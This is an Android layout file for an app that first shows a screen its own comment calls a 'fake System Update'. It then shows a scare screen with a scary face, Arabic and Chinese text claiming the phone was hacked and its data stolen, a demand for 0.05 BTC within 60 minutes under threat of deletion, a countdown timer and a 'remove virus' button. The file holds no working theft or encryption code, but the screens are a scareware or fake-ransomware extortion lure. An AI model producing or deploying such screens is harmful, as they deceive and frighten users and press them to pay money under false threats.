<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/rootLayout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#000000">

    <!-- Phase 1: fake System Update (normal looking) -->
    <LinearLayout
        android:id="@+id/updateScreen"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:orientation="vertical"
        android:gravity="center"
        android:padding="24dp"
        android:background="#FFFFFF"
        android:visibility="visible">

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="تحديث النظام"
            android:textSize="26sp"
            android:textColor="#111111"
            android:textStyle="bold" />

        <TextView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_marginTop="12dp"
            android:text="System Update\nجارٍ التحقق من التحديثات...\nPlease wait..."
            android:textSize="16sp"
            android:textColor="#333333"
            android:gravity="center" />

        <ProgressBar
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="28dp"
            android:indeterminate="true" />

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="20dp"
            android:text="لا تغلق هذه النافذة"
            android:textSize="14sp"
            android:textColor="#666666" />
    </LinearLayout>

    <!-- Phase 2: scare screen -->
    <FrameLayout
        android:id="@+id/scareScreen"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:visibility="gone">

        <ImageView
            android:id="@+id/scaryImage"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:scaleType="centerCrop"
            android:src="@drawable/scary_face"
            android:alpha="0.92" />

        <View
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="#99AA0000" />

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:gravity="center"
            android:padding="20dp">

            <TextView
                android:id="@+id/scareText"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="⚠ تم اختراق جهازك ⚠"
                android:textColor="#FF2222"
                android:textSize="22sp"
                android:textStyle="bold"
                android:gravity="center" />

            <TextView
                android:id="@+id/timerText"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="14dp"
                android:text="الوقت المتبقي: 59:59"
                android:textColor="#FFFF00"
                android:textSize="26sp"
                android:textStyle="bold" />

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="20dp"
                android:text="تم سرقة بياناتك وصورك ورسائلك.\nادفع 0.05 BTC خلال 60 دقيقة وإلا سيتم حذف كل شيء.\n\n您的数据已被窃取"
                android:textColor="#FFFFFF"
                android:textSize="15sp"
                android:gravity="center" />

            <Button
                android:id="@+id/cureButton"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="28dp"
                android:text="إزالة الفيروس / 解除病毒"
                android:textColor="#FFFFFF"
                android:backgroundTint="#AA0000"
                android:paddingHorizontal="22dp"
                android:paddingVertical="12dp" />

            <TextView
                android:id="@+id/cureText"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="20dp"
                android:textColor="#00FF00"
                android:textSize="15sp"
                android:gravity="center"
                android:visibility="gone" />
        </LinearLayout>
    </FrameLayout>
</FrameLayout>
